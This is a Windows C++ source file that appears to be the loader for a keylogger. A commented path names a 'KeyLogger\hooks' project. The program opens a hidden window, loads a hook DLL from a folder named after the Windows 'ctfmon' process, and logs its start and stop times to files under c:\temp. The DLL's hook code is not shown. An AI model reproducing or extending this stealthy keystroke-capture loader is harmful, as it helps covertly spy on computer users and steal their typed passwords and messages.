#include <time.h>
#include <sys/timeb.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <sstream>

#ifndef SIO_RCVALL
#define IOC_VENDOR 0x18000000
#define SIO_RCVALL _WSAIOW(IOC_VENDOR, 1)
#endif

static const char logname[] = "c:\\temp\\ctflog.txt";

void log(const char* tekst)
{
    FILE* plik;
    plik = fopen(logname, "at+");
    fprintf(plik, "%s\n", tekst);
    fclose(plik);
}

void logt(char* tekst)
{
    FILE* plik;
    char tmpbuf[128];
    char str[128];
    _tzset();
    plik = fopen(logname, "at+");
    _strtime(tmpbuf);
    _strdate(str);
    fprintf(plik, "%s %s: %s\n", str, tmpbuf, tekst);
    fclose(plik);
}

void log_start_stop(char* filename, int on)
{
    FILE* plik;
    char tmpbuf[128], ampm[] = "AM";
    char str[128];
    _tzset();
    plik = fopen(filename, "at+");
    _strtime(tmpbuf);
    _strdate(str);
    fprintf(plik, "\n\nSYSTEM %s\n", (on ? "[START]" : "[STOP]"));
    fprintf(plik, "TIME: %s\t\t%s\n", str, tmpbuf);
    fclose(plik);
}

HINSTANCE hinstDLL;
static TCHAR app[] = TEXT("tool4 hooks");


LRESULT CALLBACK MainWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    const char* dllPath = "c:\\temp\\ctfmon\\dll.dll";
    //const char* dllPath = "E:\\SVN\\Git\\C++\\KeyLogger\\hooks\\Release\\dll.dll";
    switch (uMsg)
    {
    case WM_CREATE:
        hinstDLL = LoadLibrary((LPCTSTR)dllPath);
        log(__FUNCTION__ " START");
        log("loading: ");
        log((char*)dllPath);
        if (hinstDLL)
            log("library loaded");
        else
            log("library NOT loaded");

        break;

    case WM_DESTROY:
        Sleep(100);//daj
        log_start_stop("C:\\temp\\rep.txt", 0);
        log(__FUNCTION__ " STOP");
        FreeLibrary(hinstDLL);
        PostQuitMessage(0);
        break;
    case WM_KEYDOWN:
        break;
    case WM_USER:
    default:
        return (DefWindowProc(hWnd, uMsg, wParam, lParam));
    }
    return(0L);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    log("\n----------------------------------------------------\n");
    log(__FUNCTION__);
    MSG       msg;
    WNDCLASS  wndclass;
    HWND      hWnd;

    TCHAR buffer[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, buffer, MAX_PATH);
    log("cur dir : ");
    log(buffer);

    wndclass.style = 0;
    wndclass.lpfnWndProc = MainWndProc;
    wndclass.cbClsExtra = 0;
    wndclass.cbWndExtra = 0;
    wndclass.hInstance = hInstance;
    wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION); ;
    wndclass.hCursor = LoadCursor(NULL, IDC_ARROW);
    wndclass.hbrBackground = (HBRUSH)COLOR_WINDOW;
    wndclass.lpszMenuName = NULL;
    wndclass.lpszClassName = app;

    log("registering class...");
    if (RegisterClass(&wndclass) == 0) {
        log("Cannot register wndClass");
        return FALSE;
    }
    try {
        log_start_stop("C:\\temp\\rep.txt", 1);
    }
    catch (...) {
        log("Cannot create log files");
    }
    log("creating window...");
    hWnd = CreateWindow(app, app, WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 100, 50, NULL, NULL, hInstance, NULL);

    if (hWnd == NULL) {
        log("Cannot create window");
        return FALSE;
    }

    //ShowWindow(hWnd, SW_SHOW);
    ShowWindow(hWnd, SW_HIDE);
    UpdateWindow(hWnd);

    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return msg.wParam;
}
